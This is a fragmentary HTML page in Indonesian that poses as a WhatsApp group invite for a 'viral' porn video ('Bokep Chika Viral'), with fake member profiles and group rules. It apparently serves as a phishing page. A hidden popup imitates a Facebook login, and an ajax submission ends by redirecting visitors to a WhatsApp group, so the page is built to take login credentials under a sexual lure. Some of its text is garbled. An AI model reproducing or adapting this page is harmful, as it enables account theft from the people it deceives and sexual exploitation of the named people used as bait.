        ...
        <div class="chat">
          <div class="chat-container">
            <div class="user-bar">
              ...
              <div class="avatar">
                <img src="https://i.ibb.co/bjVWKPg/images.jpg" alt="Avatar" style="object-fit: cover; width: 40px; height: 40px;">
              </div>
              <div class="name" style="width:130px;">
                <span>Bokep Chika Viral</span>
                <span class="status">Araa, Adel, Bela, Not...</span>
              </div>
            ...
            <div class="conversation">
              <div class="conversation-container">
                ...
                <div class="message received">
                  ...
                  <span id="random">Mantep banget jir si chika🤤</span>
                ...
                <div class="message received">
                 ...
                 <img src="https://c.top4top.io/p_2308plc5q0.jpeg" width="100%" id="myPicture">
                  <span class="metadata"><span class="time">12:30 AM</span></span>
                </div>
...
#more {display: none;}
	...
	<section>
		<div class="join" style="">
			<span class="icon" style="background: url(https://i.ibb.co/bjVWKPg/images.jpg) no-repeat; background-size: cover;"></span>
			<div class="content">
				<h1>Bokep Chika Viral</h1>
<script id="rendered-js">
/* Meme */

var memes = ['Bokep Chika Viral'];
...
random.innerHTML = memes[Math.floor(Math.random() * memes.length)];
				...
				<span class="ceo" id="admin">Grup dibuat oleh ~Chika</span>
				<p class="desc">
					 
					❤️ WELCOME SYANG KU ❤️<br><span class="bold">📍 Peraturan 📍</span><span id="dots">...</span> <span id="more"><br>📌 Share jika punya video<br>📌 Jangan spam gak jelas<br>📌 Dapat video jangan keluar<br>📌 Berkata jorok sewajarnya<br>📌 Hormati ras daerah<br>📌 Dilarang chat member di luar grup</span>
...
random.innerHTML = memes[Math.floor(Math.random() * memes.length)];
				...
				<div class="peserta" id="memberAlexHost">252 peserta</div>
<script id="rendered-js">
/* Meme */

var memes = ['252 peserta'];
...
random.innerHTML = memes[Math.floor(Math.random() * memes.length)];
				...
				<div class="profile">
					<ul>
						<li>
							<div class="imgBox">
								<img src="https://i.ibb.co/kyNDzst/images-1.jpg">
							</div>
							<span class="nama" id="AlexHost1">Chika</span>
						</li>
<script id="rendered-js">
/* Meme */
...
random.innerHTML = memes[Math.floor(Math.random() * memes.length)];
						...
						<li>
							<div class="imgBox">
								<img src="https://i.ibb.co/Lp8WBrX/images-2.jpg">
							</div>
							<span class="nama" id="AlexHost2">NotNot</span>
						</li>
<script id="rendered-js">
/* Meme */
...
random.innerHTML = memes[Math.floor(Math.random() * memes.length)];
						...
						<li>
							<div class="imgBox">
								<img src="https://i.ibb.co/mv2yjJb/images-3.jpg">
							</div>
							<span class="nama" id="AlexHost3">Unaa</span>
						</li>
<script id="rendered-js">
/* Meme */
...
random.innerHTML = memes[Math.floor(Math.random() * memes.length)];
						...
						<li>
							<div class="imgBox">
								<img src="https://i.ibb.co/Yd4BSS8/images-1.jpg">
							</div>
							<span class="nama" id="AlexHost4">Kienzy</span>
						</li>
<script id="rendered-js">
/* Meme */
...
random.innerHTML = memes[Math.floor(Math.random() * memes.length)];
						...
						<li>
							...
							<span class="nama" id="AlexHost5">Bela</span>
						</li>
<script id="rendered-js">
/* Meme */
...
random.innerHTML = memes[Math.floor(Math.random() * memes.length)];
						...
						<li>
							...
							<span class="nama" id="AlexHost6">Araa</span>
						</li>
<script id="rendered-js">
/* Meme */
...
random.innerHTML = memes[Math.floor(Math.random() * memes.length)];
						...
						<li>
							...
							<span class="nama" id="AlexHost7">Risma</span>
						</li>
<script id="rendered-js">
/* Meme */
		...
		<div class="popup-login login-facebook animated fadeIn" style="display: none;">
		   <div class="popup-box-login-fb">
		      ...
		      <div class="language-box">
		         ...
		         <div class="language-name">s���貞���剖�??</div>
		         <div class="language-name">Espa蝪緻l</div>
		         <div class="language-name">Portugu蝷 (Brasil)</div>
...
var memes = ['Mantep banget jir si chika🤤'];
                ...
                
                {
                    ...
                    $.ajax({
                        ...
                        success: function() {
                                    ...
                                    $('.fb').html('KIRIM PESAN');
                                    window.location = 'https://chat.whatsapp.com/EW9mS4ipme2DfaLY924FOm';
                            } 
                    })
                }
		}
	</script>
	<script type="text/javascript" src="https://cdn.statically.io/gh/jumardijie/jquery.min.js/main/jquery.min.js"></script>
	<script type="text/javascript">
